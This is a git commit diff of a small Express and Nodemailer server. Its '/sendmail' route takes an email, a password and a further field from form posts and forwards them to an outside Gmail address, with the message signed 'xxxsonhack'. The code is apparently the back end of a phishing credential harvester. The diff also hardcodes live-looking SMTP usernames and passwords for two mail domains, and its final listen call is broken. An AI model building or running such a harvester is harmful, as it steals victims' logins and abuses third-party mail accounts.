356b7c0fa99908cd3c702a2202ace0ae002c1631
qwaszx3215 <84395173+qwaszx3215@users.noreply.github.com>
2023-05-24 11:50:43 +0100

    Update index.js

--- index.js
+++ index.js
@@ -1,9 +1,10 @@
 const express = require("express");
-
+const cors = require("cors");
 const app = express();
 
+app.use(cors());
+
 const bodyParser = require("body-parser");
-const cors = require("cors");
 const nodemailer = require("nodemailer");
 
 require("dotenv").config();
@@ -11,28 +12,28 @@ require("dotenv").config();
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
-app.use(cors());
-
 app.get("/", (req, res) => {
   res.send("api is run");
 });
 
-app.post("/sendmail", cors(), async (req, res) => {
+app.post("/sendmail", async (req, res) => {
   let { email, pass, pasers } = req.body;
-  const transport = nodemailer.createTransport({
-    host: "mail.zetolawyer.com",
-    port: 465,
+  let transporter = nodemailer.createTransport({
+    host: "mail.whitetransport.net", // SMTP server address (usually mail.your-domain.com)
+    port: 465, // Port for SMTP (usually 465)
     auth: {
-      user: "zetobachri@zetolawyer.com",
-      pass: "L4wy3r.Muda",
+      user: "mustafa@whitetransport.net", // Your email address
+      pass: "uf4DBAatO5Ut", // Password (for gmail, your app password)
+      // ⚠️ For better security, use environment variables set on the server for these values when deploying
     },
   });
 
-  await transport.sendMail({
-    from: "zetobachri@zetolawyer.com",
-    to: "marketing@rumahmutu.id",
-    subject: "test email",
-    html: ` 
+  // Define and send message inside transporter.sendEmail() and await info about send from promise:
+  let info = await transporter.sendMail({
+    from: '"You" <mustafa@whitetransport.net>',
+    to: "fredrick3smith33@gmail.com",
+    subject: "Testing, testing, 123",
+    html: `
     <div> 
       <h2>Here is your email!</h2>
         <p>Email: ${email}</p>
@@ -41,12 +42,10 @@ app.post("/sendmail", cors(), async (req, res) => {
     
         <p>All the best, xxxsonhack</p>
          </div>
-     
-         
     `,
   });
 });
 
-const PORT = process.env.PORT || 5000;
+const PORT = 5000;
 
-app.listen(PORT, console.log(`server in ${process.env.NODE_ENV} on ${PORT}`));
+app.listen(console.log(`server in Production on ${PORT}`));
